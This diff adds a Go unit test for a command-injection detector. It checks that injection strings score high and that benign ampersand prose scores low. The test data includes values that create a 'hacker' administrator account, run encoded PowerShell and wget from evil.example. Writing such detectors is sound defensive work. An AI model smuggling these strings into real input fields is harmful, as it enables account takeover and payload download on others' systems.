@@ -69,3 +69,37 @@ func TestRedirectionToKeyValueIsNotAFile(t *testing.T) {
 		}
 	}
 }
+
+func TestWindowsAmpersandAndProse(t *testing.T) {
+	for _, a := range []string{
+		`& net user hacker P@ss /add`,
+		`x & whoami`,
+		`& ipconfig /all`,
+		`a & net localgroup administrators hacker /add`,
+		`1 & reg query HKLM\Software`,
+		`& powershell -enc SQBFAFgA`,
+		`; ping -c 10 127.0.0.1`,
+		`; ping evil.example`,
+		`name &whoami`,
+		`test; wget http://evil.example/x`,
+	} {
+		if got := cmdiTotal(a); got < 50 {
+			t.Errorf("Detect(%q) = %d, want >= 50", a, got)
+		}
+	}
+	for _, b := range []string{
+		`wget downloads files; ping checks reachability`,
+		`curl fetches pages; nslookup resolves names to addresses`,
+		`terms & conditions apply`,
+		`Q & A session at noon`,
+		`AT&T and Procter & Gamble`,
+		`R&D budget & net income for the year`,
+		`salt & pepper, cut & paste, rock & roll`,
+		`fish &amp; chips`,
+		`sc & net profit`,
+	} {
+		if got := cmdiTotal(b); got >= 50 {
+			t.Errorf("Detect(%q) = %d, want < 50", b, got)
+		}
+	}
+}
